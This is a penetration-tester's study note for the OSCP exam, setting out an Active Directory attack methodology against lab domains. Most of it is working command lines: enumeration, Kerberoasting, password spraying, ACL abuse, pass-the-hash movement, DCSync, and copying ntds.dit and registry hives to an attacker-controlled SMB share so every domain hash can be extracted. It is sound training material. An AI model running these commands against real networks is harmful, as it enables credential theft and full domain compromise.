---
tags: [methodology, active-directory, oscp]
---

# 05 — Active Directory

> Back to [[00 - Index (MOC)]]. The OSCP AD set is 40 pts and **chained** — foothold user → escalate → lateral → Domain Admin. You're usually given assumed-breach creds. Detailed tool notes linked throughout.

**You're in AD when:** ports 88/389/636/3268 open, DC hostname (`DC01`), `.htb`/`.local` domain in LDAP/RDP certs.

## Setup
```bash
export DC=10.10.x.x DOMAIN=domain.htb
echo "$DC dc01.$DOMAIN $DOMAIN" | sudo tee -a /etc/hosts
sudo ntpdate $DC          # fix clock skew BEFORE Kerberos (KRB_AP_ERR_SKEW)
```

---

## Phase 1 — Enumerate WITHOUT creds
```bash
nxc smb $DC -u '' -p '' --shares                       # null session <- Don't forget to re-enumerate
enum4linux-ng -A $DC
rpcclient -U "" -N $DC -c "enumdomusers;querydominfo"   # → users.txt
ldapsearch -x -H ldap://$DC -b "DC=domain,DC=htb"       # anon bind
kerbrute userenum -d $DOMAIN --dc $DC users.txt         # valid users (no creds)
nxc smb $DC -u '' -p '' --rid-brute                     # RID cycling via SAMR/LSA (works even if share/user enum is locked down)
```
`--rid-brute` walks well-known SIDs (`DOMAIN-SID-RID`) through SAMR/LSA and resolves SID→name — a separate null-session surface from share/user listing, often open when those are locked down. Also works post-foothold with any low-priv creds (`-u user -p pass --rid-brute`) to surface accounts `enumdomusers` missed. Manual equivalent: `rpcclient -U "" -N $DC -c "lookupsids S-1-5-21-<domain-sid>-500"`.
**AS-REP roast** (users with pre-auth disabled — no creds needed):
```bash
impacket-GetNPUsers $DOMAIN/ -usersfile users.txt -no-pass -dc-ip $DC -format hashcat
# crack → hashcat -m 18200
```
**Responder** (poison LLMNR/NBT-NS → capture NetNTLMv2) → [[Responder]] / [[Inveigh]]. Too strong to crack? **Relay** the live auth instead → [[06 - Password Attacks]] (Net-NTLMv2 capture → relay).
Tools: [[enum4linux]] · [[rpcclient]] · [[ldapsearch]] · [[kerbrute]] · [[Windapsearch]]

---

## Phase 2 — Enumerate WITH creds
```bash
nxc smb $DC -u user -p pass --shares --users --groups --pass-pol
nxc ldap $DC -u user -p pass --bloodhound --collection All --dns-server $DC
# or:
bloodhound-python -u user -p pass -d $DOMAIN -ns $DC -c all --zip
```
Load the zip into **BloodHound** → mark owned → run *Shortest Path to Domain Admins*.
Tools: [[BloodHound]] · [[Bloodhound-Python]] · [[Rusthound]] · [[CrackMapExec]]

**From a Windows foothold (on-host, no RSAT):** enumerate live/targeted with PowerView — `Get-NetUser/-NetGroup/-NetComputer`, `Find-LocalAdminAccess`, `Get-ObjectAcl`/`Find-InterestingDomainAcl`, `Get-NetUser -SPN`, `Find-DomainShare`. Quieter & more surgical than SharpHound for verifying a specific edge. Full cheat-sheet: [[PowerView]].

**Kerberoast** (crackable service-account hashes):
```bash
impacket-GetUserSPNs $DOMAIN/user:pass -dc-ip $DC -request -outputfile kerb.hash
# crack → hashcat -m 13100
```

**ADCS** (very common OSCP-adjacent path):
```bash
certipy find -u user@$DOMAIN -p pass -dc-ip $DC -vulnerable -stdout    # ESC1-ESC8
```
Tool: [[Certipy]].

---

## Phase 3 — Attack paths (match to BloodHound findings)

| Edge / finding                      | Attack                           | Tool               |
| ----------------------------------- | -------------------------------- | ------------------ |
| AS-REP roastable                    | GetNPUsers → crack               | hashcat 18200      |
| SPN set (Kerberoast)                | GetUserSPNs → crack              | hashcat 13100      |
| `GenericAll`/`GenericWrite` on user | reset password / set SPN → roast | [[BloodyAD]]       |
| `GenericAll` on group               | add self to group                | net rpc / bloodyAD |
| `WriteDACL` / `WriteOwner`          | grant self rights → DCSync       | dacledit           |
| `ForceChangePassword`               | reset target's password          | net rpc password   |
| `AddSelf` on group                  | add to group                     |                    |
| ESC1 (SAN in cert)                  | request cert as admin            | [[Certipy]]        |
| ESC8 (NTLM relay to CA)             | relay → cert                     | certipy relay      |
| Unconstrained delegation            | capture TGT / printerbug         | rubeus/petitpotam  |
| Constrained delegation              | S4U2self/proxy                   | [[Rubeus]] / getST |
| RBCD (`GenericWrite` on computer)   | set msDS-AllowedToActOnBehalf    | rbcd.py            |
| DCSync rights                       | dump all hashes                  | [[secretsdump.py]] |
| MachineAccountQuota > 0             | add computer (noPac/RBCD)        |                    |
| Member of `Backup Operators`        | SeBackup → remote NTDS.dit dump  | ↓ Backup Operators |

`ForceChangePassword` in practice (no cleartext of old pw needed):
```bash
rpcclient -U domain/attacker $DC
rpcclient $> setuserinfo <target_user> 23 'NewP@ssw0rd!'
```
Check the lockout policy before spraying/resetting anything: `ldapsearch -D 'DOMAIN\user' -w pass -p 389 -h $DC -b "dc=domain,dc=local" -s sub "*" | grep lockoutThreshold` — `0` means no lockout, spray freely (still noisy).

---

## Phase 4 — Lateral movement & exec

**Enumerate BEFORE you move** — three questions decide the next hop:
1. **Where am I (this user) local admin?** → which hosts you can exec on.
   ```bash
   nxc smb <range> -u user -p pass            # (Pwn3d!) = admin there
   ```
   ```powershell
   Find-LocalAdminAccess                      # PowerView, on-host
   ```
2. **Who is logged in where?** → whose hashes/tickets you can steal once admin on that box.
   ```bash
   nxc smb <range> -u user -p pass --loggedon-users    # or --sessions
   ```
   ```powershell
   Get-NetSession -ComputerName <host> -Verbose ; .\PsLoggedon.exe \\<host>
   Find-DomainUserLocation                    # hunt high-value users' sessions
   ```
3. **What's the shortest path to the goal?** → BloodHound: mark owned → *Shortest Paths to Domain Admins from Owned Principals*.

**The loop:** land on a box you're admin on → dump cached creds/tickets there (mimikatz `sekurlsa::logonpasswords` / `::tickets /export`) → reuse them (PtH/OPtH/PtT) to reach the next box → **re-enumerate from the new principal**. Repeat until DA. See [[22-ad-introduction-and-enumeration]] · [[24-lateral-movement-in-active-directory]].

```bash
evil-winrm -i $IP -u user -p pass                         # or -H hash (PtH)
impacket-psexec $DOMAIN/user:pass@$IP                     # SYSTEM (noisy)
impacket-wmiexec $DOMAIN/user:pass@$IP                    # quieter
nxc smb <range> -u user -p pass                           # spray to find where creds work
```
Pass-the-Ticket:
```bash
export KRB5CCNAME=ticket.ccache
impacket-psexec -k -no-pass $DOMAIN/user@target.$DOMAIN
```
Tools: [[evil-winrm]] · [[impacket-psexec]] · [[psexec.py]] · [[Wmiexec.py]]

---

## Phase 5 — Domain compromise
```bash
# DCSync everything (need replication rights or DA)
impacket-secretsdump $DOMAIN/user:pass@$DC -just-dc
impacket-secretsdump $DOMAIN/administrator@$DC -hashes :<nthash>
# Then PtH as Administrator / krbtgt
evil-winrm -i $DC -u administrator -H <nthash>
```
Persistence (lab only): Golden Ticket from `krbtgt` hash.

---

## Backup Operators → remote NTDS.dit dump (no DCSync rights needed)
`whoami /priv` shows `SeBackupPrivilege`/`SeRestorePrivilege` **Enabled** on a DC (usually via `Backup Operators` membership) → you can back up and restore *any* file, including a live `ntds.dit`, without DCSync rights or Domain Admin.

**Method A — `wbadmin` (built-in, needs a share you control):**
```cmd
:: on Kali — stand up a samba share that accepts a matching local user (wbadmin needs real SMB auth, not anon)
:: /etc/samba/smb.conf: [smb] path=/tmp/ guest ok=yes force user=smbuser
adduser smbuser && smbpasswd -a smbuser && service smbd restart
```
```powershell
net use k: \\LHOST\smb /user:smbuser smbpass
echo "Y" | wbadmin start backup -backuptarget:\\LHOST\smb -include:c:\windows\ntds
wbadmin get versions                                                       # note Version identifier
echo "Y" | wbadmin start recovery -version:<ver> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
reg save HKLM\SYSTEM C:\system.hive
copy ntds.dit \\LHOST\smb\ & copy system.hive \\LHOST\smb\
```
```bash
impacket-secretsdump -ntds NTDS.dit -system system.hive LOCAL     # → all domain hashes incl. Administrator
```

**Method B — `diskshadow` + SeBackupPrivilege DLLs (quieter, no wbadmin backup job, works when `ntds.dit` is locked):**
```cmd
:: cmd.txt
set context persistent nowriters
add volume c: alias temp
create
expose %temp% h:
```
```cmd
diskshadow /s cmd.txt          :: exposes a shadow copy at H:\ — bypasses the file lock on ntds.dit
```
Then, from Evil-WinRM, upload `SeBackupPrivilegeUtils.dll` + `SeBackupPrivilegeCmdLets.dll` ([SeBackupPrivilege repo](https://github.com/giuliano108/SeBackupPrivilege)):
```powershell
import-module .\SeBackupPrivilegeCmdLets.dll; import-module .\SeBackupPrivilegeUtils.dll
Copy-FileSeBackupPrivilege h:\windows\ntds\ntds.dit c:\windows\temp\NTDS -Overwrite
Copy-FileSeBackupPrivilege h:\windows\system32\config\SYSTEM c:\windows\temp\SYSTEM -Overwrite
download NTDS; download SYSTEM
```
Not a DC? Same `Copy-FileSeBackupPrivilege` trick pulls `SAM`/`SECURITY`/`SYSTEM` instead → `secretsdump.py -sam sam -security security -system system LOCAL`.

⚠️ **PtH context gotcha:** once you have the Administrator hash, use **`wmiexec`**, not `psexec` — psexec creates a SYSTEM-context service, which loses the Administrator token and will fail to decrypt any EFS-protected files. `wmiexec.py -hashes :<nthash> administrator@$DC` preserves the Administrator security context.

> **Lesson (Blackfield):** notes.txt on the Administrator desktop said the flag was EFS-encrypted specifically to force this distinction — a robocopy-as-SYSTEM or psexec shell can read the file but not decrypt it. Only a full Administrator-context logon (wmiexec PtH, or a real interactive session) can.

---

## AD gotchas (checklist)
- [ ] **Fix clock skew** before any Kerberos (`ntpdate $DC`)
- [ ] Add domain + DC to `/etc/hosts` (Kerberos needs names, not IPs)
- [ ] Spray found passwords across **all** users/hosts — reuse is everywhere
- [ ] Re-run BloodHound as each newly owned principal
- [ ] Check **descriptions** field on users (passwords hide there)
- [ ] `--pass-pol` before spraying (avoid lockouts)
- [ ] Pivot needed? Kerberos breaks over SOCKS → use **Ligolo** → [[Pivoting-Tunneling]]
- [ ] `whoami /groups` on every shell — `Backup Operators` membership = instant path to NTDS.dit (see ↑ Backup Operators), no DCSync needed
- [ ] Non-default SMB shares (`forensic`, `backup`, `IT`, etc.) often hold **loot from a previous incident** — lsass/SAM dumps, notes, scripts. Check ACLs against every user you gain.

---

## References
- The Hacker Recipes (AD): https://www.thehacker.recipes/
- HackTricks AD: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
- Certipy / ADCS: https://github.com/ly4k/Certipy
- Great sources: [[Great Sources for AD]]
